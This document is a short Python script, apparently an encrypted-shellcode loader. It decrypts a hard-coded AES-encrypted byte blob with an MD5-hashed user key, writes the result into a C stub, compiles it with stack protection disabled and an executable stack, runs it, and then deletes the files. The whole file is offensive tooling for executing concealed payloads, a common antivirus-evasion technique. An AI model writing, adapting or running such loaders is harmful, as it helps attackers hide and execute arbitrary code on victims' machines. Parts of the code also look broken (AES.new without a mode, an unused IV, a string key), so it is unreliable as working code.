#!/usr/bin/env python3

from Crypto.Cipher import AES
import sys
import os,random
import hashlib

shellcode = b"\xbc\x9a\xea\x90\x5c\x19\xb7\x89\xfc\xfe\x58\x12\x91\x24\x7d\x22\xce\x15\x55\xfe\x0f\x02\x24\x1e\xf5\xa1\x45\x96\x36\x24\xe2\xaa"

def md5(key):
    bk = str.encode(key)
    hashed = hashlib.md5(bk)
    return hashed.hexdigest()

def form(shellcode):
    res = ""
    for x in shellcode :
        res += "\\x%02x" % x
    return res

def unpad(shellcode):
    shellcode = form(shellcode)
    return shellcode.replace("\\x2a","")

def execute(shellcode):
    file = open("121.c","w")
    file.write('''
#include <stdio.h>

int main(){
    unsigned char code[] = \"''' + shellcode + '''";
    int (*ret)() = (int(*)())code;
    ret();
}
    ''')
    file.close()
    os.system("gcc -fno-stack-protector -z execstack -o 121 121.c")
    os.system("./121")
    os.system("rm 121 121.c")

key = input("Enter the decryption key : ")
key = md5(key)
iv = ''.join([chr(random.randint(0,255)) for i in range(16)])
cipher = AES.new(key)
decrypted = cipher.decrypt(shellcode)
shellcode = unpad(decrypted)

print("[+] Decrypted shellcode : \n{}\n".format(shellcode))
print("[-->] Executing the decrypted shellcode : ")
execute(shellcode)
